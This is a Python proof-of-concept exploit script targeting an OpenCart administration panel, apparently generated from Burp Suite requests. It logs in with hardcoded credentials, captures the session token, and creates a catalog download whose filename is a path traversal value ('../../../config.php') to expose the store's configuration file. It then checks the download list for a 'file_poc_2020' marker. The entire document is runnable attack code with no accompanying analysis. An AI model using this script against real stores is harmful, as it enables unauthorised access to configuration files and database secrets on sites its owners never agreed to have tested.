import requests
import urllib3
requests.packages.urllib3.disable_warnings()
host = "opencart66.com"


def loginad():
    burp0_url = "https://"+host+":443//admin/index.php?route=common/login"
    burp0_headers = {"Referer": "https://"+host+"/admin/", "Cache-Control": "max-age=0","Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3","Content-Type": "multipart/form-data; boundary=---------------------------7e43b42b30a14","Upgrade-Insecure-Requests": "1","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
    burp0_data = "-----------------------------7e43b42b30a14\nContent-Disposition: form-data; name=\"username\"\n\nuser\n-----------------------------7e43b42b30a14\nContent-Disposition: form-data; name=\"password\"\n\nbitnami1\n-----------------------------7e43b42b30a14--\n"
    session = requests.Session()
    res = session.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False, allow_redirects=False)
    location=res.headers['location']
    cookies=res.cookies['OCSESSID']
    token=location[-32:]
     
   #print(cookies)
   #print(token)
    return cookies, token
     

def addfile(adcookies,adtoken):
    burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download/add&user_token="+adtoken
    burp0_cookies = {"currency": "USD", "__atuvc": "2%7C15", "language": "en-gb", "OCSESSID": adcookies}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Origin": "https://"+host, "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary5RfMTwxCvuqzbNCQ", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
    burp0_data = "------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"download_description[1][name]\"\n\nfile_poc_2020\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"filename\"\n\n../../../config.php\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ\nContent-Disposition: form-data; name=\"mask\"\n\n123\n------WebKitFormBoundary5RfMTwxCvuqzbNCQ--\n"
    session = requests.Session()
    res = session.post(burp0_url, headers=burp0_headers,  data=burp0_data,verify=False, allow_redirects=False)
    #print(res.text)
    

    burp0_url = "https://"+host+":443/admin/index.php?route=catalog/download&user_token="+adtoken
    burp0_cookies = {"currency": "USD", "__atuvc": "2%7C15", "language": "en-gb", "OCSESSID": adcookies}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36", "Sec-Fetch-Dest": "document", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Referer": "https://"+host+"/admin/index.php?route=catalog/download/add&user_token="+adtoken, "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9"}
    r_check=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
    print("add file")
    return r_check
    #print(r.status_code)
    #print(r.text)
   

def check_poc(r_check):
    if("file_poc_2020" in r_check.text):
        print('PoC success!')
        return 0
    else:
        print('PoC failed!')
        return -1


if __name__ == "__main__":
    n=loginad()
    adcookies=n[0]
    adtoken=n[1]
    print(adcookies)
    print(adtoken)   
    r_check=addfile(adcookies,adtoken)
    result=check_poc(r_check)
    exit(result)
    
 






